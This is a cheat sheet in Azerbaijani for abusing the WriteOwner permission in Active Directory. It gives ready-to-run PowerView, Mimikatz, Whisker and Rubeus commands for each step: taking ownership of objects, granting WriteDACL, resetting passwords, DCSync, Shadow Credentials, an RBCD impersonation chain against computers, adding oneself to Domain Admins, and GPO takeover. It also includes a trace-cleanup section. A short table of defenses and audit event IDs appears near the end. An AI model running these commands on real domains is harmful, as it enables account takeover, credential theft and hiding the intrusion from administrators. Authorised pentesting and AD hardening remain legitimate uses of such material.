# 🔐 Active Directory — WriteOwner ACL Cheat Sheet

> **WriteOwner** hüququ — bir istifadəçiyə AD obyektinin **sahibini dəyişdirməyə** icazə verir.  
> Sahibi dəyişdirdikdən sonra **WriteDACL** əldə etmək və tam nəzarəti ələ keçirmək mümkündür.

---

## 📌 Enumeration (Axtarış)

### Bütün WriteOwner hüquqlarını tapmaq
```powershell
Get-DomainObjectAcl | Where-Object {$_.ActiveDirectoryRights -eq "WriteOwner"} |
  Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},
                @{Name="ObjectSid"; Expression={Convert-SidToName $_.ObjectSid}},
                ActiveDirectoryRights -Unique
```

### Konkret obyektdə WriteOwner axtarmaq
```powershell
Get-DomainObjectAcl -Identity "jkimmich" |
  Where-Object {$_.ActiveDirectoryRights -eq "WriteOwner"} |
  Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},
                ActiveDirectoryRights -Unique
```

### Konkret istifadəçinin hansı obyektlər üzərində WriteOwner-ə sahib olduğunu tapmaq
```powershell
$sid = Convert-NameToSid "targetuser"
Get-DomainObjectAcl | Where-Object {
    $_.ActiveDirectoryRights -match "WriteOwner" -and
    $_.SecurityIdentifier -eq $sid
} | Select-Object ObjectDN, ActiveDirectoryRights
```

### BloodHound ilə görselleştirmek
```
BloodHound → Node Search → jkimmich → Outbound Object Control → WriteOwner
```

---

## ⚔️ İstismar (Exploitation)

### Mərhələ 1 — Obyektin sahibini özünüzə dəyişdirin

```powershell
# PowerView ilə
Set-DomainObjectOwner -Identity "jkimmich" -OwnerIdentity "attacker_user"
```

```powershell
# PowerShell ilə (manual)
$acl = Get-Acl "AD:\CN=jkimmich,DC=domain,DC=local"
$acl.SetOwner([System.Security.Principal.NTAccount]"DOMAIN\attacker_user")
Set-Acl "AD:\CN=jkimmich,DC=domain,DC=local" $acl
```

---

### Mərhələ 2 — WriteDACL hüququ əlavə edin

```powershell
# Sahibi dəyişdirdikdən sonra WriteDACL hüququ verin
Add-DomainObjectAcl -TargetIdentity "jkimmich" `
                    -PrincipalIdentity "attacker_user" `
                    -Rights WriteDACL
```

---

### Mərhələ 3 — Hədəfə görə hücum

#### 🧑 Hədəf: İstifadəçi (User Object)

**A) Şifrəni sıfırlamaq (ForceChangePassword)**
```powershell
Add-DomainObjectAcl -TargetIdentity "jkimmich" `
                    -PrincipalIdentity "attacker_user" `
                    -Rights ResetPassword

$cred = ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force
Set-DomainUserPassword -Identity "jkimmich" -AccountPassword $cred
```

**B) Hash almaq (DCSync — Domain Admin lazımdır)**
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" `
                    -PrincipalIdentity "attacker_user" `
                    -Rights DCSync

# Mimikatz ilə
lsadump::dcsync /domain:domain.local /user:jkimmich
```

**C) Shadow Credentials (ADCS olmasa da işləyir)**
```powershell
# Whisker ilə
Whisker.exe add /target:jkimmich

# Sonra Rubeus ilə TGT al
Rubeus.exe asktgt /user:jkimmich /certificate:<base64> /password:<pass> /ptt
```

---

#### 🖥️ Hədəf: Kompüter (Computer Object)

**Resource-Based Constrained Delegation (RBCD) hücumu**
```powershell
# Kompüterin sahibini dəyişdirin
Set-DomainObjectOwner -Identity "TARGETPC$" -OwnerIdentity "attacker_user"

# WriteDACL əlavə edin
Add-DomainObjectAcl -TargetIdentity "TARGETPC$" `
                    -PrincipalIdentity "attacker_user" `
                    -Rights WriteDACL

# Fake kompüter hesabı yaradın
New-MachineAccount -MachineAccount "FakePC" -Password (ConvertTo-SecureString "P@ss123!" -AsPlainText -Force)

# RBCD ayarlayın
$fakeSID = Get-DomainComputer "FakePC" -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$fakeSID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity "TARGETPC$" -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# S4U2Self/S4U2Proxy ilə impersonation
Rubeus.exe s4u /user:FakePC$ /rc4:<NTLM> /impersonateuser:Administrator /msdsspn:cifs/TARGETPC.domain.local /ptt
```

---

#### 🏢 Hədəf: Qrup (Group Object)

**Özünüzü qrupa əlavə etmək**
```powershell
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "attacker_user"

Add-DomainObjectAcl -TargetIdentity "Domain Admins" `
                    -PrincipalIdentity "attacker_user" `
                    -Rights WriteMembers

Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker_user"
```

---

#### 🌐 Hədəf: GPO (Group Policy Object)

```powershell
Set-DomainObjectOwner -Identity "<GPO-GUID>" -OwnerIdentity "attacker_user"

Add-DomainObjectAcl -TargetIdentity "<GPO-GUID>" `
                    -PrincipalIdentity "attacker_user" `
                    -Rights All

# GPO ilə hər şey: komanda çalışdırma, local admin əlavə etmək, scheduled task
```

---

## 🔄 Tam Attack Chain

```
WriteOwner hüququ
    │
    ▼
Set-DomainObjectOwner  ──►  Sahibi dəyişdir
    │
    ▼
Add-DomainObjectAcl    ──►  WriteDACL / GenericAll əldə et
    │
    ├──► User hedefi   → ForceChangePassword / Shadow Credentials / DCSync
    ├──► Group hedefi  → WriteMembers → qrupa əlavə ol
    ├──► Computer hedefi → RBCD → S4U2Proxy → Impersonation
    └──► GPO hedefi    → Malicious GPO → RCE / Persistence
```

---

## 🧹 İzləri Silmək (Cleanup)

```powershell
# ACL-i geri qaytarmaq
Remove-DomainObjectAcl -TargetIdentity "jkimmich" `
                       -PrincipalIdentity "attacker_user" `
                       -Rights WriteDACL

# Sahibi geri qaytarmaq
Set-DomainObjectOwner -Identity "jkimmich" -OwnerIdentity "Domain Admins"
```

---

## 🛡️ Müdafiə (Defense)

| Kontrol | Açıqlama |
|--------|----------|
| **Privileged Access Workstation** | Admin işlərini izolyasiya etmək |
| **Protected Users Group** | Sensitive hesabları qorumaq |
| **AdminSDHolder monitoring** | Qorunan obyektlərdə ACL dəyişikliklərini izləmək |
| **AD Auditing** | `4662` — Object access, `5136` — Directory object modify |
| **BloodHound/PlumHound** | WriteOwner path-lərini müntəzəm yoxlamaq |
| **Tiered Admin Model** | T0/T1/T2 ayrımı — lateral movement-i məhdudlaşdırmaq |

### Monitorinq üçün Event ID-lər
```
4662 → AD obyektinə giriş (WriteOwner istifadəsi)
5136 → AD obyektinin dəyişdirilməsi (owner dəyişikliyi)
4670 → Obyektin icazələrinin dəyişdirilməsi
```

---

## 🔧 İstifadə Olunan Alətlər

| Alət | Funksiya |
|------|----------|
| `PowerView` | Enumeration, ACL dəyişikliyi |
| `BloodHound` | Attack path görselleştirme |
| `Whisker` | Shadow Credentials |
| `Rubeus` | Kerberos TGT/S4U |
| `Mimikatz` | DCSync, pass-the-hash |
| `Impacket` | Linux-dan DCSync (`secretsdump.py`) |

---

*Cheat sheet yalnız izinli pentest mühitlərində istifadə üçün nəzərdə tutulub.*
